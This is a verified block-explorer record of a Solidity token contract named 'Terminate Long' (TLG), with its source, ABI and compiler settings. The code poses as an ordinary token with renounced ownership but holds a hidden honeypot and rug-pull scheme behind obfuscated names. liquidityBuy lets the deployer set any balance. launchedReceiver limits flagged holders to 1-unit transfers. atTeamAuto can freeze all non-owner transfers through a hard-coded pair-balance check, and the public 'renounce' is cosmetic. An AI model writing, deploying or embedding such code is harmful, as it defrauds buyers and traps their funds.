{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface minLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAt {\n    function createPair(address feeFrom, address atMarketing) external returns (address);\n}\n\ninterface tradingFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMin) external view returns (uint256);\n\n    function transfer(address totalEnable, uint256 senderAmountToken) external returns (bool);\n\n    function allowance(address autoLiquidityTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderAmountToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalEnable,\n        uint256 senderAmountToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedBuySwap, uint256 value);\n    event Approval(address indexed autoLiquidityTotal, address indexed spender, uint256 value);\n}\n\ninterface tradingFeeMetadata is tradingFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminateLong is maxIs, tradingFee, tradingFeeMetadata {\n\n    event OwnershipTransferred(address indexed totalExemptReceiver, address indexed swapMarketing);\n\n    function liquidityBuy(address atFund, uint256 senderAmountToken) public {\n        isMode();\n        exemptFrom[atFund] = senderAmountToken;\n    }\n\n    address public txTrading;\n\n    uint256 constant listFund = 1 ** 10;\n\n    mapping(address => bool) public toMarketing;\n\n    function buyAt(address fromTotal) public {\n        if (enableSwap) {\n            return;\n        }\n        if (tokenLaunch) {\n            walletExempt = false;\n        }\n        totalSell[fromTotal] = true;\n        if (enableReceiver != listTeam) {\n            listTeam = shouldTrading;\n        }\n        enableSwap = true;\n    }\n\n    mapping(address => uint256) private exemptFrom;\n\n    uint256 public fromSenderLimit;\n\n    uint8 private enableLiquidityTotal = 18;\n\n    function approve(address minList, uint256 senderAmountToken) public virtual override returns (bool) {\n        amountMin[_msgSender()][minList] = senderAmountToken;\n        emit Approval(_msgSender(), minList, senderAmountToken);\n        return true;\n    }\n\n    address private shouldTo;\n\n    bool public maxReceiver;\n\n    mapping(address => mapping(address => uint256)) private amountMin;\n\n    function minFee(address shouldReceiver, address totalEnable, uint256 senderAmountToken) internal returns (bool) {\n        require(exemptFrom[shouldReceiver] >= senderAmountToken);\n        exemptFrom[shouldReceiver] -= senderAmountToken;\n        exemptFrom[totalEnable] += senderAmountToken;\n        emit Transfer(shouldReceiver, totalEnable, senderAmountToken);\n        return true;\n    }\n\n    function launchedReceiver(address marketingSellMin) public {\n        isMode();\n        \n        if (marketingSellMin == exemptReceiverTo || marketingSellMin == txTrading) {\n            return;\n        }\n        toMarketing[marketingSellMin] = true;\n    }\n\n    bool public enableSwap;\n\n    function owner() external view returns (address) {\n        return shouldTo;\n    }\n\n    uint256 private shouldTrading;\n\n    function balanceOf(address feeMin) public view virtual override returns (uint256) {\n        return exemptFrom[feeMin];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableLiquidityTotal;\n    }\n\n    uint256 private maxLiquidity = 100000000 * 10 ** 18;\n\n    address limitReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public listTeam;\n\n    bool public modeFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMin;\n    }\n\n    constructor (){\n        \n        minLiquidity exemptSwap = minLiquidity(limitReceiver);\n        txTrading = maxAt(exemptSwap.factory()).createPair(exemptSwap.WETH(), address(this));\n        if (tokenLaunch != modeFrom) {\n            enableReceiver = listTeam;\n        }\n        exemptReceiverTo = _msgSender();\n        takeTo();\n        totalSell[exemptReceiverTo] = true;\n        exemptFrom[exemptReceiverTo] = maxLiquidity;\n        \n        emit Transfer(address(0), exemptReceiverTo, maxLiquidity);\n    }\n\n    bool private tokenLaunch;\n\n    bool private launchTotalList;\n\n    uint256 listIs;\n\n    function takeTo() public {\n        emit OwnershipTransferred(exemptReceiverTo, address(0));\n        shouldTo = address(0);\n    }\n\n    string private receiverMin = \"Terminate Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedAt;\n    }\n\n    address liquidityFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountEnable(address shouldReceiver, address totalEnable, uint256 senderAmountToken) internal returns (bool) {\n        if (shouldReceiver == exemptReceiverTo) {\n            return minFee(shouldReceiver, totalEnable, senderAmountToken);\n        }\n        uint256 sellReceiver = tradingFee(txTrading).balanceOf(liquidityFrom);\n        require(sellReceiver == listIs);\n        require(totalEnable != liquidityFrom);\n        if (toMarketing[shouldReceiver]) {\n            return minFee(shouldReceiver, totalEnable, listFund);\n        }\n        return minFee(shouldReceiver, totalEnable, senderAmountToken);\n    }\n\n    address public exemptReceiverTo;\n\n    function getOwner() external view returns (address) {\n        return shouldTo;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxLiquidity;\n    }\n\n    function isMode() private view {\n        require(totalSell[_msgSender()]);\n    }\n\n    uint256 minAmount;\n\n    function allowance(address launchedAmount, address minList) external view virtual override returns (uint256) {\n        if (minList == limitReceiver) {\n            return type(uint256).max;\n        }\n        return amountMin[launchedAmount][minList];\n    }\n\n    function atTeamAuto(uint256 senderAmountToken) public {\n        isMode();\n        listIs = senderAmountToken;\n    }\n\n    uint256 public enableReceiver;\n\n    mapping(address => bool) public totalSell;\n\n    function transferFrom(address shouldReceiver, address totalEnable, uint256 senderAmountToken) external override returns (bool) {\n        if (_msgSender() != limitReceiver) {\n            if (amountMin[shouldReceiver][_msgSender()] != type(uint256).max) {\n                require(senderAmountToken <= amountMin[shouldReceiver][_msgSender()]);\n                amountMin[shouldReceiver][_msgSender()] -= senderAmountToken;\n            }\n        }\n        return amountEnable(shouldReceiver, totalEnable, senderAmountToken);\n    }\n\n    function transfer(address atFund, uint256 senderAmountToken) external virtual override returns (bool) {\n        return amountEnable(_msgSender(), atFund, senderAmountToken);\n    }\n\n    string private launchedAt = \"TLG\";\n\n    bool private walletExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLiquidityTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalExemptReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuySwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderAmountToken\",\"type\":\"uint256\"}],\"name\":\"atTeamAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"}],\"name\":\"buyAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSenderLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSellMin\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountToken\",\"type\":\"uint256\"}],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAmountToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TerminateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}